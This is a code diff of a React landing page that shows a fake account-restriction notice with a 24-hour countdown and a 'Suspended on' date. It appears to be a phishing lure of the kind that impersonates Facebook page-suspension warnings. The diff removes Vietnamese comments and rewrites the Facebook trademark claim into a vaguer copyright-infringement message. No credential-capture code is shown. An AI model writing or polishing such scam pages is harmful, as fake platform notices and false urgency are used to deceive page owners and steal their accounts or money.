@@ -13,11 +13,9 @@ function Landing() {
   }, []);
 
   useEffect(() => {
-    // kiểm tra trong localStorage đã có deadline chưa
     let deadline = localStorage.getItem("deadline");
 
     if (!deadline) {
-      // nếu chưa có thì tạo mới (24h từ bây giờ)
       deadline = new Date().getTime() + 24 * 60 * 60 * 1000;
       localStorage.setItem("deadline", deadline);
     }
@@ -28,7 +26,7 @@ function Landing() {
       setTimeLeft(diff);
     };
 
-    updateTimer(); // chạy ngay lần đầu
+    updateTimer(); 
     const timer = setInterval(updateTimer, 1000);
 
     return () => clearInterval(timer);
@@ -69,7 +67,7 @@ function Landing() {
             ⚠️ Your page is temporarily restricted.
           </p>
           <p className="text-sm sm:text-base mt-2">
-            Your Facebook page has been reported for trademark infringement.
+            Our system has detected that your website may be infringing on third party images or videos.
           </p>
           <p className="text-xs sm:text-sm text-gray-500 mt-3">
             Suspended on {date}
